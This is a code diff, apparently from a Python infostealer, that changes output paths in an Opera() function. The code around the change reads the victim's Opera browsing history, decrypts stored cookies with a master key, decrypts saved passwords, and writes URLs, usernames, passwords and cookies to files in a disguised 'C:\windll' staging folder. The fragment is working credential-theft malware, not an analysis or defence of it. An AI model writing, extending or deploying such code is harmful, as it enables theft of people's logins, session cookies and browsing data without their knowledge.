@@ -57,7 +57,7 @@ def Opera():
         c = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\historyOPERA.db')
         cursor = c.cursor()
         temp = []
-        with open(rf"C:\windll\Opera\history-opera.txt", "a", encoding="utf-8") as history:
+        with open(rf"C:\windll\Browsers\Opera\history-opera.txt", "a", encoding="utf-8") as history:
             for result in cursor.execute(HistorySQL).fetchall():
                 data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
                 result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {time(data[2])}\n\n"
@@ -105,7 +105,7 @@ def Opera():
     },
             '''% (result[1], result[7], result[2], http, result[6], secure, decrypt(result[5], get_master_key_chrome()))
 
-        with open(rf"C:\windll\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
+        with open(rf"C:\windll\Browsers\Opera\Cookies-Opera.json", "a", encoding="utf-8") as cookies:
             results = results.replace('True', 'true')
             results = results.replace('False', 'false')
             results += '\n]'
@@ -174,7 +174,7 @@ def Opera():
 
             alldatapass = "URL: " + url + " UserName: " + username + " Password: " + decrypted_password + "\n"
 
-            with open(r'C:\windll\Opera\opera-passwords.txt', "a") as o:
+            with open(r'C:\windll\Browsers\Opera\opera-passwords.txt', "a") as o:
                 o.write(alldatapass)
         try:
 
